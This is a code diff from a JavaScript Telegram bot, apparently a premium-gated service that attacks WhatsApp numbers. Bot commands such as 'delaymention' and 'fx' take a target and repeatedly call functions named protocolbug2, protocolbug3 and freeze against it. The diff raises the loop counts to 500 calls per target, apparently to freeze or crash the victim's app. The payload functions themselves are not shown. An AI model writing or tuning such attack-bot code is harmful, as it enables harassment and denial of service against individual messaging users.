@@ -1328,10 +1328,7 @@ bot.command("delaymention", checkWhatsAppConnection, checkPremium, async ctx => 
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 50; i++) {
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await protocolbug2(target, true)
+  for (let i = 0; i < 500; i++) {
         await protocolbug3(target, true)
         await sleep(1000)
     
@@ -1340,7 +1337,7 @@ bot.command("delaymention", checkWhatsAppConnection, checkPremium, async ctx => 
   await donerespone(target, ctx);
 });
 
-bot.command("fz", checkWhatsAppConnection, checkPremium, async ctx => {
+bot.command("fx", checkWhatsAppConnection, checkPremium, async ctx => {
   const q = ctx.message.text.split(" ")[1];
 
   if (!q) {
@@ -1351,8 +1348,9 @@ bot.command("fz", checkWhatsAppConnection, checkPremium, async ctx => {
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 5; i++) {
-        await freeze(target, true);
+  for (let i = 0; i < 500; i++) {
+        await protocolbug2(target, true);
+        await sleep(1000)
     
 }
 
